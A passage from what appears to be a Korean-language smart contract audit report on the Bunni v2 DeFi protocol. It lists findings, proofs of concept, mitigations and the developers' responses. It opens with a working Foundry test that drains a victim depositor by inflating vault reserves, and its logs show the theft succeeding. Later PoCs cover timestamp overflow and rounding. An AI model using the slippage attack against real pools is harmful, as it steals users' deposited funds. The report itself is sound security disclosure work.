    PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
    PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
    vm.stopPrank();

    // mint tokens
    _mint(key.currency0, victim, depositAmount0);
    _mint(key.currency1, victim, depositAmount1);

    // deposit tokens
    depositParams = IBunniHub.DepositParams({
        poolKey: key,
        amount0Desired: depositAmount0,
        amount1Desired: depositAmount1,
        amount0Min: depositAmount0 * 99 / 100,        // victim uses a slippage protection of 99%
        amount1Min: depositAmount0 * 99 / 100,        // victim uses a slippage protection of 99%
        deadline: block.timestamp,
        recipient: victim,
        refundRecipient: victim,
        vaultFee0: 0,
        vaultFee1: 0,
        referrer: address(0)
    });

    vm.prank(victim);
    (uint256 sharesVictim, uint256 victimAmount0In, uint256 victimAmount1In) = hub.deposit(depositParams);
    console.log("Amount 0 deposited by victim", victimAmount0In);
    console.log("Amount 1 deposited by victim", victimAmount1In);

    IBunniHub.WithdrawParams memory withdrawParams = IBunniHub.WithdrawParams({
        poolKey: key,
        recipient: firstDepositor,
        shares: sharesFirstDepositor,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        useQueuedWithdrawal: false
    });
    vm.prank(firstDepositor);
    (uint256 withdrawAmount0FirstDepositor, uint256 withdrawAmount1FirstDepositor) = hub.withdraw(withdrawParams);
    console.log("Amount 0 withdrawn by first depositor", withdrawAmount0FirstDepositor);
    console.log("Amount 1 withdrawn by first depositor", withdrawAmount1FirstDepositor);

    withdrawParams = IBunniHub.WithdrawParams({
        poolKey: key,
        recipient: victim,
        shares: sharesVictim,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        useQueuedWithdrawal: false
    });
    vm.prank(victim);
    (uint256 withdrawAmount0Victim, uint256 withdrawAmount1Victim) = hub.withdraw(withdrawParams);
    console.log("Amount 0 withdrawn by victim", withdrawAmount0Victim);
    console.log("Amount 1 withdrawn by victim", withdrawAmount1Victim);
}
```

이 PoC에서 토큰 금액을 더 명확하게 볼 수 있도록 `UniformDistribution`을 사용하여 토큰 비율을 1:1로 설정했습니다. 피해자가 입금하기 직전에 첫 번째 입금자가 볼트 준비금을 크게 증가시켜 `BunniHub`가 두 토큰 모두 훨씬 더 많은 준비금을 가지고 있다고 믿게 만드는 것을 관찰할 수 있습니다. `BunniHub`는 이러한 거대한 토큰 잔액을 고려하여 피해자를 위해 발행할 주식 금액을 계산합니다. 결과적으로 피해자는 매우 적은 양의 주식을 받게 됩니다. 그 후 공격자는 훨씬 더 많은 주식을 보유하고 있기 때문에 피해자가 입금한 거의 모든 금액을 인출할 수 있습니다.

Output:
```bash
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_SlippageAttack() (gas: 5990352)
Logs:
  Amount 0 deposited by first depositor     999999999999999999
  Amount 1 deposited by first depositor     999999999999999999
  Amount 0 deposited by victim           100000000000000000000
  Amount 1 deposited by victim           100000000000000000000
  Amount 0 withdrawn by first depositor  100999897877778912580
  Amount 1 withdrawn by first depositor  100999897877778912580
  Amount 0 withdrawn by victim                   1122222209640
  Amount 1 withdrawn by victim                   1122222209640

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 885.72ms (5.18ms CPU time)
```

**Recommended Mitigation:** 입금을 실행할 때 입금자가 발행할 최소 주식 금액을 제공하도록 허용하십시오. PoC에서 볼 수 있듯이 토큰 비율이 변경되지 않았기 때문에 슬리피지 보호가 효과적이지 않았습니다.

```diff
    struct DepositParams {
        PoolKey poolKey;
        address recipient;
        address refundRecipient;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        uint256 deadline;
        address referrer;
++      uint256 sharesMin;
        uint256 vaultFee0;
        uint256 vaultFee1;
    }

    function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
        external
        returns (uint256 shares, uint256 amount0, uint256 amount1)
    {
        ...

--      // check slippage
--      if (amount0 < params.amount0Min || amount1 < params.amount1Min) {
--          revert BunniHub__SlippageTooHigh();
--      }

        // mint shares using actual token amounts
        shares = _mintShares(
            msgSender,
            state.bunniToken,
            params.recipient,
            amount0,
            depositReturnData.balance0,
            amount1,
            depositReturnData.balance1,
```
```solidity
            params.referrer
        );

        // check slippage
        if (amount0 < params.amount0Min || amount1 < params.amount1Min || shares < params.sharesMin) {
            revert BunniHub__SlippageTooHigh();
        }
        ...
    }
```

**Bacon Labs:** 인지됨(Acknowledged). 보고서에서 제안한 것처럼 사용자가 범위를 벗어난 악성 볼트가 있는 풀에 고의로 입금해야 하므로 변경하지 않을 것입니다.

**Cyfrin:** 인지됨(Acknowledged).


### Hooklet validation is recommended upon deploying new Bunni tokens

**Description:** Uniswap V4는 유효한 계약이 제공되었는지 확인하기 위해 후크 주소에 대한 몇 가지 검증을 수행합니다:
```solidity
function initialize(PoolKey memory key, uint160 sqrtPriceX96) external noDelegateCall returns (int24 tick) {
    ...
    if (!key.hooks.isValidHookAddress(key.fee)) Hooks.HookAddressNotValid.selector.revertWith(address(key.hooks));
    ...
}

function isValidHookAddress(IHooks self, uint24 fee) internal pure returns (bool) {
    // The hook can only have a flag to return a hook delta on an action if it also has the corresponding action flag
    if (!self.hasPermission(BEFORE_SWAP_FLAG) && self.hasPermission(BEFORE_SWAP_RETURNS_DELTA_FLAG)) return false;
    if (!self.hasPermission(AFTER_SWAP_FLAG) && self.hasPermission(AFTER_SWAP_RETURNS_DELTA_FLAG)) return false;
    if (!self.hasPermission(AFTER_ADD_LIQUIDITY_FLAG) && self.hasPermission(AFTER_ADD_LIQUIDITY_RETURNS_DELTA_FLAG))
    {
        return false;
    }
    if (
        !self.hasPermission(AFTER_REMOVE_LIQUIDITY_FLAG)
            && self.hasPermission(AFTER_REMOVE_LIQUIDITY_RETURNS_DELTA_FLAG)
    ) return false;

    // If there is no hook contract set, then fee cannot be dynamic
    // If a hook contract is set, it must have at least 1 flag set, or have a dynamic fee
    return address(self) == address(0)
        ? !fee.isDynamicFee()
        : (uint160(address(self)) & ALL_HOOK_MASK > 0 || fee.isDynamicFee());
}
```
Hooklet과 관련하여 `BEFORE_SWAP_FLAG`에 대한 권한도 검증하는 것이 모범 사례입니다.

**Recommended Mitigation:**
```solidity
function deployBunniToken(HubStorage storage s, Env calldata env, IBunniHub.DeployBunniTokenParams calldata params)
    external
    returns (IBunniToken token, PoolKey memory key)
{
    ...
    if (!params.hooklet.isValidHookletAddress()) revert();
    ...
}

function isValidHookletAddress(IHooklet self) internal pure returns (bool isValid) {
    isValid = true;

    // The hooklet can only have a flag to override the fee and price if it also has the corresponding action flag
    if (!self.hasPermission(BEFORE_SWAP_FLAG) && (self.hasPermission(BEFORE_SWAP_OVERRIDE_FEE_FLAG) || self.hasPermission(BEFORE_SWAP_OVERRIDE_PRICE_FLAG))) return false;
}
```

**Bacon Labs:** 인지됨(Acknowledged). 말도 안 되는 플래그 조합(`BEFORE_SWAP_FLAG`를 설정하지 않고 `BEFORE_SWAP_OVERRIDE_FEE_FLAG`를 설정하는 등)이 정의되지 않은 동작을 초래하지 않으므로 그대로 유지하겠습니다.

**Cyfrin:** 인지됨(Acknowledged).


### `BuyTheDipGeometricDistribution` parameter encoding documentation is inconsistent

**Description:** `BuyTheDipGeometricDistribution` [매개변수 인코딩 문서](https://docs.bunni.xyz/docs/v2/technical/ldf/params/#parameter-encoding-5)는 알파 값 사이에 사용되지 않는 바이트를 지정했습니다. 그러나 이는 `LibBuyTheDipGeometricDistribution::decodeParams`의 실제 구현과 일치하지 않으므로 수정해야 합니다:

```solidity
function decodeParams(bytes32 ldfParams)
    internal
    pure
    returns (
        int24 minTick,
        int24 length,
        uint256 alphaX96,
        uint256 altAlphaX96,
        int24 altThreshold,
        bool altThresholdDirection
    )
{
    // static minTick set in params
    // | shiftMode - 1 byte | minTick - 3 bytes | length - 2 bytes | alpha - 4 bytes | altAlpha - 4 bytes | altThreshold - 3 bytes | altThresholdDirection - 1 byte |
    minTick = int24(uint24(bytes3(ldfParams << 8))); // must be aligned to tickSpacing
    length = int24(int16(uint16(bytes2(ldfParams << 32))));
    uint256 alpha = uint32(bytes4(ldfParams << 48));
    alphaX96 = alpha.mulDiv(Q96, ALPHA_BASE);
    uint256 altAlpha = uint32(bytes4(ldfParams << 80));
    altAlphaX96 = altAlpha.mulDiv(Q96, ALPHA_BASE);
    altThreshold = int24(uint24(bytes3(ldfParams << 112)));
    altThresholdDirection = uint8(bytes1(ldfParams << 136)) != 0;
}
```

**Bacon Labs:** 인지됨(Acknowledged). 문서에서 수정되었습니다.

**Cyfrin:** 인지됨(Acknowledged).


### Typographical error in `BunniHookLogic::beforeSwap` should be corrected

**Description:** 문제를 일으키지는 않지만 `BunniHookLogic::beforeSwap` 내의 `hookHandleSwapOutoutAmount` 선언에 오타가 있습니다. 이는 모든 후속 사용과 함께 `hookHandleSwapOutputAmount`여야 합니다.

**Bacon Labs:** [PR \#125](https://github.com/timeless-fi/bunni-v2/pull/125)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 오류가 수정되었습니다.


### Unchecked queue withdrawal timestamp logic is implemented incorrectly

**Description:** `BunniHubLogic::queueWithdraw` 내에서 `WITHDRAW_DELAY`가 포함된 블록 타임스탬프의 합계가 최대 `uint56`을 초과하는 경우 래핑(wrap around)하기 위해 확인되지 않은(unchecked) 수학이 사용됩니다:

```solidity
    // update queued withdrawal
    // use unchecked to get unlockTimestamp to overflow back to 0 if overflow occurs
    // which is fine since we only care about relative time
    uint56 newUnlockTimestamp;
    unchecked {
@>      newUnlockTimestamp = uint56(block.timestamp) + WITHDRAW_DELAY;
    }
    if (queued.shareAmount != 0) {
        // requeue expired queued withdrawal
@>      if (queued.unlockTimestamp + WITHDRAW_GRACE_PERIOD >= block.timestamp) {
            revert BunniHub__NoExpiredWithdrawal();
        }
        s.queuedWithdrawals[id][msgSender].unlockTimestamp = newUnlockTimestamp;
    } else {
        // create new queued withdrawal
        if (params.shares == 0) revert BunniHub__ZeroInput();
        s.queuedWithdrawals[id][msgSender] =
            QueuedWithdrawal({shareAmount: params.shares, unlockTimestamp: newUnlockTimestamp});
    }
```

이것은 최대 `uint56` 모듈로인 `newUnlockTimestamp`를 산출합니다. 그러나 `BunniHubLogic::withdraw`에도 존재하는 기존 대기열 인출의 잠금 해제 타임스탬프에 `WITHDRAW_GRACE_PERIOD`가 추가된 것에 유의하십시오:

```solidity
    if (params.useQueuedWithdrawal) {
        // use queued withdrawal
        // need to withdraw the full queued amount
        QueuedWithdrawal memory queued = s.queuedWithdrawals[poolId][msgSender];
        if (queued.shareAmount == 0 || queued.unlockTimestamp == 0) revert BunniHub__QueuedWithdrawalNonexistent();
@>      if (block.timestamp < queued.unlockTimestamp) revert BunniHub__QueuedWithdrawalNotReady();
@>      if (queued.unlockTimestamp + WITHDRAW_GRACE_PERIOD < block.timestamp) revert BunniHub__GracePeriodExpired();
        shares = queued.shareAmount;
        s.queuedWithdrawals[poolId][msgSender].shareAmount = 0; // don't delete the struct to save gas later
        state.bunniToken.burn(address(this), shares); // BunniTokens were deposited to address(this) earlier with queueWithdraw()
    }
```

이 로직은 올바르게 구현되지 않았으며 다양한 시나리오에서 몇 가지 의미를 갖습니다:
* `WITHDRAW_DELAY`가 있는 주어진 대기열 인출에 대한 잠금 해제 타임스탬프가 오버플로우되지 않지만 `WITHDRAW_GRACE_PERIOD`를 추가하면 오버플로우되는 경우, 확인되지 않은 블록 밖의 `uint56` 오버플로우로 인해 대기열 인출이 되돌려지며 같은 이유로 만료된 인출을 다시 대기열에 넣을 수 없습니다.
* `WITHDRAW_DELAY`가 있는 주어진 대기열 인출에 대한 잠금 해제 타임스탬프가 오버플로우되고 래핑되면, "만료된" 인출을 즉시 다시 대기열에 넣을 수 있습니다. 비교해 보면 `uint256`의 블록 타임스탬프가 `WITHDRAW_GRACE_PERIOD`가 적용된 잠금 해제 타임스탬프보다 훨씬 클 것이기 때문입니다. 그러나 래핑 후 블록 타임스탬프는 항상 훨씬 더 클 것이므로 이러한 인출을 실행할 수 없습니다(교체 없이도).

**Impact:** `block.timestamp`가 태양의 수명 내에 `uint56` 오버플로우에 도달할 가능성은 낮지만, 의도된 확인되지 않은 로직이 잘못 구현되어 대기열 인출이 올바르게 실행되지 못하게 합니다. 데이터 유형의 너비가 문제가 없다고 가정하고 줄어들면 특히 문제가 될 수 있습니다.

**Proof of Concept:** 다음 테스트는 `test/BunniHub.t.sol` 내에서 실행할 수 있습니다:
```solidity
function test_queueWithdrawPoC1() public {
    uint256 depositAmount0 = 1 ether;
    uint256 depositAmount1 = 1 ether;
    (IBunniToken bunniToken, PoolKey memory key) = _deployPoolAndInitLiquidity();

    // make deposit
    (uint256 shares,,) = _makeDepositWithFee({
        key_: key,
        depositAmount0: depositAmount0,
        depositAmount1: depositAmount1,
        depositor: address(this),
        vaultFee0: 0,
        vaultFee1: 0,
        snapLabel: ""
    });

    // bid in am-AMM auction
    PoolId id = key.toId();
    bunniToken.approve(address(bunniHook), type(uint256).max);
    uint128 minRent = uint128(bunniToken.totalSupply() * MIN_RENT_MULTIPLIER / 1e18);
    uint128 rentDeposit = minRent * 2 days;
    bunniHook.bid(id, address(this), bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), minRent * 2, rentDeposit);
    shares -= rentDeposit;

    // wait until address(this) is the manager
    skipBlocks(K);
    assertEq(bunniHook.getTopBid(id).manager, address(this), "not manager yet");

    vm.warp(type(uint56).max - 1 minutes);

    // queue withdraw
    bunniToken.approve(address(hub), type(uint256).max);
    hub.queueWithdraw(IBunniHub.QueueWithdrawParams({poolKey: key, shares: shares.toUint200()}));
    assertEqDecimal(bunniToken.balanceOf(address(hub)), shares, DECIMALS, "didn't take shares");

    // wait 1 minute
    skip(1 minutes);

    // withdraw
    IBunniHub.WithdrawParams memory withdrawParams = IBunniHub.WithdrawParams({
        poolKey: key,
        recipient: address(this),
        shares: shares,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        useQueuedWithdrawal: true
    });
    vm.expectRevert();
    hub.withdraw(withdrawParams);
}

function test_queueWithdrawPoC2() public {
    uint256 depositAmount0 = 1 ether;
    uint256 depositAmount1 = 1 ether;
    (IBunniToken bunniToken, PoolKey memory key) = _deployPoolAndInitLiquidity();

    // make deposit
    (uint256 shares,,) = _makeDepositWithFee({
        key_: key,
        depositAmount0: depositAmount0,
        depositAmount1: depositAmount1,
        depositor: address(this),
        vaultFee0: 0,
        vaultFee1: 0,
        snapLabel: ""
    });

    // bid in am-AMM auction
    PoolId id = key.toId();
    bunniToken.approve(address(bunniHook), type(uint256).max);
    uint128 minRent = uint128(bunniToken.totalSupply() * MIN_RENT_MULTIPLIER / 1e18);
    uint128 rentDeposit = minRent * 2 days;
    bunniHook.bid(id, address(this), bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), minRent * 2, rentDeposit);
    shares -= rentDeposit;

    // wait until address(this) is the manager
    skipBlocks(K);
    assertEq(bunniHook.getTopBid(id).manager, address(this), "not manager yet");

    vm.warp(type(uint56).max);

    // queue withdraw
    bunniToken.approve(address(hub), type(uint256).max);
    hub.queueWithdraw(IBunniHub.QueueWithdrawParams({poolKey: key, shares: shares.toUint200()}));
    assertEqDecimal(bunniToken.balanceOf(address(hub)), shares, DECIMALS, "didn't take shares");

    // wait 1 minute
    skip(1 minutes);

    // re-queue before expiry
    hub.queueWithdraw(IBunniHub.QueueWithdrawParams({poolKey: key, shares: shares.toUint200()}));

    // withdraw
    IBunniHub.WithdrawParams memory withdrawParams = IBunniHub.WithdrawParams({
        poolKey: key,
        recipient: address(this),
        shares: shares,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        useQueuedWithdrawal: true
    });
    vm.expectRevert();
    hub.withdraw(withdrawParams);
}
```

**Recommended Mitigation:** `block.timestamp`의 다른 모든 사용을 `uint56`으로 안전하지 않게 다운캐스트하여 동일한 방식으로 계산된 잠금 해제 타임스탬프와 비교할 때 조용히 오버플로우되도록 허용하십시오.

**Bacon Labs:** [PR \#126](https://github.com/timeless-fi/bunni-v2/pull/126)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 대기열 인출 중에 `uint56` 오버플로우가 처리됩니다.


### Inconsistent rounding directions should be clarified and standardized

**Description:** 체계적인 반올림을 위해 어느 정도 노력을 기울였지만 반올림 처리 및/또는 방향이 일관되지 않은 경우가 많이 남아 있습니다. 첫 번째 예는 `LibCarpetedGeometricDistribution::liquidityDensityX96` 내에서 반환된 카펫 유동성을 올림(rounds up)하는 경우입니다:

```solidity
return carpetLiquidity.divUp(uint24(numRoundedTicksCarpeted));
```

한편, `LibCarpetedDoubleGeometricDistribution::liquidityDensityX96`은 내림(rounds down)합니다:

```solidity
return carpetLiquidity / uint24(numRoundedTicksCarpeted);
```

또한 모든 rick의 밀도 기여도 합계가 `Q96`을 초과하도록 허용하는 구성이 확인되었습니다. 현재 rick 유동성만 계산에 사용되므로 극소량의 추가 유동성 밀도를 차지할 뿐이므로 문제는 없어 보입니다.

**Proof of Concept:** 다음 테스트는 `GeometricDistribution.t.sol` 내에서 실행할 수 있습니다:

```solidity
function test_liquidityDensity_sumUpToOneGeometricDistribution(int24 tickSpacing, int24 minTick, int24 length, uint256 alpha)
    external
    virtual
{
    alpha = bound(alpha, MIN_ALPHA, MAX_ALPHA);
    vm.assume(alpha != 1e8); // 1e8 is a special case that causes overflow
    tickSpacing = int24(bound(tickSpacing, MIN_TICK_SPACING, MAX_TICK_SPACING));
    (int24 minUsableTick, int24 maxUsableTick) =
        (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));
    minTick = roundTickSingle(int24(bound(minTick, minUsableTick, maxUsableTick - 2 * tickSpacing)), tickSpacing);
    length = int24(bound(length, 1, (maxUsableTick - minTick) / tickSpacing - 1));

    console2.log("alpha", alpha);
    console2.log("tickSpacing", tickSpacing);
    console2.log("minTick", minTick);
    console2.log("length", length);

    PoolKey memory key;
    key.tickSpacing = tickSpacing;
    bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.STATIC, minTick, int16(length), uint32(alpha)));
    vm.assume(ldf.isValidParams(key, 0, ldfParams));


    uint256 cumulativeLiquidityDensity;
    (int24 minTick, int24 maxTick) =
        (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing) - tickSpacing);
    key.tickSpacing = tickSpacing;
    int24 spotPriceTick = 0;
    for (int24 tick = minTick; tick <= maxTick; tick += tickSpacing) {
        (uint256 liquidityDensityX96,,,,) = ldf.query(key, tick, 0, spotPriceTick, ldfParams, LDF_STATE);
        cumulativeLiquidityDensity += liquidityDensityX96;
    }

    console2.log("Cumulative liquidity density", cumulativeLiquidityDensity);
    console2.log("One", FixedPoint96.Q96);
    if(cumulativeLiquidityDensity > FixedPoint96.Q96) console2.log("Extra cumulative liquidity density", cumulativeLiquidityDensity - FixedPoint96.Q96);
    assertTrue(cumulativeLiquidityDensity <= FixedPoint96.Q96);
}
```

**Recommended Mitigation:** 인라인 주석으로 불투명한 반올림 결정에 대해 더 명확히 하고 위에서 언급한 불일치 사항을 표준화하십시오.

**Bacon Labs:** [PR \#127](https://github.com/timeless-fi/bunni-v2/pull/127)에서 LibCarpetedDoubleGeometricDistribution 반올림 문제를 수정했습니다. 총 밀도가 `Q96`을 약간 초과하는 것은 괜찮다는 데 동의했습니다.

**Cyfrin:** 검증되었습니다. 이제 `LibCarpetedDoubleGeometricDistribution::liquidityDensityX96`에서 카펫 유동성이 올림됩니다.


### Just in time (JIT) liquidity can be used to inflate rebalance order amounts

**Description:** Trail of Bits 감사에서 보고된 바와 같이, 리밸런스 주문을 트리거하는 스왑 전에 JIT 유동성을 추가하면 주문을 이행하는 데 필요한 금액이 풀 내에 일반적으로 있는 것 이상으로 부풀려질 수 있습니다. 리밸런스 주문 이행 중에 Bunni 유동성을 사용할 수 있도록 수정하면, 이는 리밸런스되는 풀과 이 과정에서 사용되는 다른 풀의 유동성 모두에 영향을 미칩니다. 궁극적으로 이는 특정 시나리오에서 이행자가 리밸런스를 수행하기 위해 자신의 JIT 유동성을 제공해야 할 수 있으며, 예상보다 수익성이 낮은 이행을 초래하고 잠재적으로 다른 풀의 인출을 DoS할 수 있습니다. 공격자에 의한 JIT 유동성의 수익성 있는 추가는 현실적으로 가능성이 매우 낮습니다. 특히 일시적 재진입 가드가 잠긴 상태로 유지되므로 동일한 트랜잭션 동안 리밸런스 주문 이행 후 어떤 작업도 수행할 수 없기 때문입니다. 또한 `withdrawalUnblocked` 재정의가 설정되지 않는 한 리밸런스 주문이 처리되거나 만료될 때까지(이 경우 재계산됨) 유동성을 인출할 수 없습니다. 그럼에도 불구하고 이는 원래 리밸런스하려던 풀이 불균형 상태로 남는 등 바람직하지 않은 동작을 초래할 수 있으므로 프로덕션에 배포하기 전에 신중하게 고려해야 합니다.

**Bacon Labs:** 인지됨(Acknowledged). 수익 동기가 부족하고 풀 운영에 명확한 영향이 없기 때문에 실제로 문제가 발생할 가능성이 낮다는 데 동의합니다.

**Cyfrin:** 인지됨(Acknowledged).

\clearpage
## Gas Optimization


### Unnecessary `currency1` native token checks

**Description:** Uniswap 통화 쌍은 주소별로 정렬됩니다. 두 개의 풀 준비금 토큰 중 하나가 `address(0)`으로 지정된 기본 토큰인 경우, `currency1`은 항상 더 큰 주소를 가지므로 `currency0`일 수만 있습니다. 따라서 `currency1` 및 관련 로직에서 수행되는 기본 토큰 검증은 필요하지 않습니다.

**Recommended Mitigation:** 다음 인스턴스를 제거할 수 있습니다:

* `BunniHub.sol`:
```diff
    function _depositUnlockCallback(DepositCallbackInputData memory data) internal returns (bytes memory) {
        (address msgSender, PoolKey memory key, uint256 msgValue, uint256 rawAmount0, uint256 rawAmount1) =
            (data.user, data.poolKey, data.msgValue, data.rawAmount0, data.rawAmount1);

        PoolId poolId = key.toId();
        uint256 paid0;
        uint256 paid1;
        if (rawAmount0 != 0) {
            poolManager.sync(key.currency0);

            // transfer tokens to poolManager
            if (key.currency0.isAddressZero()) {
                if (msgValue < rawAmount0) revert BunniHub__MsgValueInsufficient();
                paid0 = poolManager.settle{value: rawAmount0}();
            } else {
                Currency.unwrap(key.currency0).excessivelySafeTransferFrom2(msgSender, address(poolManager), rawAmount0);
                paid0 = poolManager.settle();
            }

            poolManager.mint(address(this), key.currency0.toId(), paid0);
            s.poolState[poolId].rawBalance0 += paid0;
        }
        if (rawAmount1 != 0) {
            poolManager.sync(key.currency1);

            // transfer tokens to poolManager
--          if (key.currency1.isAddressZero()) {
--              if (msgValue < rawAmount1) revert BunniHub__MsgValueInsufficient();
--              paid1 = poolManager.settle{value: rawAmount1}();
--          } else {
                Currency.unwrap(key.currency1).excessivelySafeTransferFrom2(msgSender, address(poolManager), rawAmount1);
                paid1 = poolManager.settle();
--          }

            poolManager.mint(address(this), key.currency1.toId(), paid1);
            s.poolState[poolId].rawBalance1 += paid1;
        }
        return abi.encode(paid0, paid1);
    }
```

 *`BunniHubLogic.sol`:
```diff
    function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
        external
        returns (uint256 shares, uint256 amount0, uint256 amount1)
    {
        address msgSender = LibMulticaller.senderOrSigner();
        PoolId poolId = params.poolKey.toId();
        PoolState memory state = getPoolState(s, poolId);

        /// -----------------------------------------------------------------------
        /// Validation
        /// -----------------------------------------------------------------------

--      if (msg.value != 0 && !params.poolKey.currency0.isAddressZero() && !params.poolKey.currency1.isAddressZero()) {
++      if (msg.value != 0 && !params.poolKey.currency0.isAddressZero()) {
            revert BunniHub__MsgValueNotZeroWhenPoolKeyHasNoNativeToken();
        }
        ...

        // refund excess ETH
        if (params.poolKey.currency0.isAddressZero()) {
            if (address(this).balance != 0) {
                params.refundRecipient.safeTransferETH(
                    FixedPointMathLib.min(address(this).balance, msg.value - amount0Spent)
                );
            }
--      } else if (params.poolKey.currency1.isAddressZero()) {
--          if (address(this).balance != 0) {
--              params.refundRecipient.safeTransferETH(
--                  FixedPointMathLib.min(address(this).balance, msg.value - amount1Spent)
--              );
--          }
        }

        ...
    }
```

**Bacon Labs:** [PR \#114](https://github.com/timeless-fi/bunni-v2/pull/114)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. `key.currency1.isAddressZero()`에 해당하는 분기가 제거되었습니다.


### Unnecessary stack variable can be removed

**Description:** am-AMM이 활성화되었는지 여부를 반환할 때 `BunniHook::_amAmmEnabled`는 필요하지 않은 경우 스택 변수를 사용하며 대신 boolean을 직접 반환할 수 있습니다. 가독성을 높여야 하는 경우 명명된 반환 변수에 할당할 수 있습니다.

**Recommended Mitigation:**
```diff
    function _amAmmEnabled(PoolId id) internal view virtual override returns (bool) {
        bytes memory hookParams = hub.hookParams(id);
        bytes32 firstWord;
        /// @solidity memory-safe-assembly
        assembly {
            firstWord := mload(add(hookParams, 32))
        }
--      bool poolEnabled = uint8(bytes1(firstWord << 248)) != 0;
--      return poolEnabled;
++      return uint8(bytes1(firstWord << 248)) != 0;
    }
```

또는

```diff
--  function _amAmmEnabled(PoolId id) internal view virtual override returns (bool) {
++  function _amAmmEnabled(PoolId id) internal view virtual override returns (bool poolEnabled) {
        bytes memory hookParams = hub.hookParams(id);
        bytes32 firstWord;
        /// @solidity memory-safe-assembly
        assembly {
            firstWord := mload(add(hookParams, 32))
        }
--      bool poolEnabled = uint8(bytes1(firstWord << 248)) != 0;
--      return poolEnabled;
++      poolEnabled = uint8(bytes1(firstWord << 248)) != 0;
    }
```

**Bacon Labs:** [PR \#115](https://github.com/timeless-fi/bunni-v2/pull/115)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 `BunniHook::_amAmmEnabled` boolean이 직접 반환됩니다.


### Superfluous conditional branches can be combined

**Description:** `BunniHubLogic::queueWithdraw`는 주석을 사용하여 로직을 별도의 섹션으로 구분합니다. 상태 업데이트를 수행할 때 아래 표시된 조건부 로직의 `else` 분기에 의해 주어진 기존 대기열 주식 금액이 없는 경우 새로운 대기열 인출이 생성됩니다:

```solidity
function queueWithdraw(HubStorage storage s, IBunniHub.QueueWithdrawParams calldata params) external {
    ...
    if (queued.shareAmount != 0) {
        ...
    } else {
        // create new queued withdrawal
        if (params.shares == 0) revert BunniHub__ZeroInput();
        s.queuedWithdrawals[id][msgSender] =
            QueuedWithdrawal({shareAmount: params.shares, unlockTimestamp: newUnlockTimestamp});
    }

    /// -----------------------------------------------------------------------
    /// External calls
    /// -----------------------------------------------------------------------

    if (queued.shareAmount == 0) {
        // transfer shares from msgSender to address(this)
        bunniToken.transferFrom(msgSender, address(this), params.shares);
    }

    emit IBunniHub.QueueWithdraw(msgSender, id, params.shares);
}
```

별도의 외부 호출 섹션을 통해 코드를 더 읽기 쉽게 만들지만, 이 전송은 앞서 언급한 `else` 블록 내에서 실행되어 추가 조건부의 불필요한 실행을 피할 수 있습니다.

**Recommended Mitigation:**
```diff
    } else {
        // create new queued withdrawal
        if (params.shares == 0) revert BunniHub__ZeroInput();
        s.queuedWithdrawals[id][msgSender] =
            QueuedWithdrawal({shareAmount: params.shares, unlockTimestamp: newUnlockTimestamp});
++      // transfer shares from msgSender to address(this)
++      bunniToken.transferFrom(msgSender, address(this), params.shares);
    }

    /// -----------------------------------------------------------------------
    /// External calls
    /// -----------------------------------------------------------------------

--  if (queued.shareAmount == 0) {
--      // transfer shares from msgSender to address(this)
--      bunniToken.transferFrom(msgSender, address(this), params.shares);
--  }
```

**Bacon Labs:** [PR \#116](https://github.com/timeless-fi/bunni-v2/pull/116)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. `BunniHubLogic::queueWithdraw`는 새로운 대기열 인출 조건부 분기 내에 Bunni 토큰 전송을 포함하도록 단순화되었습니다.


### am-AMM fee validation can be simplified

**Description:** 스왑 수수료를 청구할 때 `BunniHookLogic::beforeSwap`은 am-AMM이 활성화되어 있는지 그리고 활성 상위 입찰이 있는지 확인하여 am-AMM 수수료를 사용해야 하는지 검증합니다:

```solidity
        // update am-AMM state
        uint24 amAmmSwapFee;
@>      if (hookParams.amAmmEnabled) {
            bytes6 payload;
            IAmAmm.Bid memory topBid = IAmAmm(address(this)).getTopBidWrite(id);
            (amAmmManager, payload) = (topBid.manager, topBid.payload);
            (uint24 swapFee0For1, uint24 swapFee1For0) = decodeAmAmmPayload(payload);
            amAmmSwapFee = params.zeroForOne ? swapFee0For1 : swapFee1For0;
        }

        // charge swap fee
        // precedence:
        // 1) am-AMM fee
        // 2) hooklet override fee
        // 3) dynamic fee
        (Currency inputToken, Currency outputToken) =
            params.zeroForOne ? (key.currency0, key.currency1) : (key.currency1, key.currency0);
        uint24 swapFee;
        uint256 swapFeeAmount;
@>      useAmAmmFee = hookParams.amAmmEnabled && amAmmManager != address(0);
```

`amAmmManager`는 am-AMM이 활성화될 때 트리거되는 조건부 블록 내부를 제외하고 다른 곳에서는 할당되지 않는 명명된 반환 값이므로, `useAmAmmFee` 할당은 `amAmmManager`에 0이 아닌 주소가 할당되었는지 확인하는 것으로 단순화할 수 있습니다.

**Recommended Mitigation:**
```diff
        // update am-AMM state
        uint24 amAmmSwapFee;
        if (hookParams.amAmmEnabled) {
            bytes6 payload;
            IAmAmm.Bid memory topBid = IAmAmm(address(this)).getTopBidWrite(id);
            (amAmmManager, payload) = (topBid.manager, topBid.payload);
            (uint24 swapFee0For1, uint24 swapFee1For0) = decodeAmAmmPayload(payload);
            amAmmSwapFee = params.zeroForOne ? swapFee0For1 : swapFee1For0;
        }

        // charge swap fee
        // precedence:
        // 1) am-AMM fee
        // 2) hooklet override fee
        // 3) dynamic fee
        (Currency inputToken, Currency outputToken) =
            params.zeroForOne ? (key.currency0, key.currency1) : (key.currency1, key.currency0);
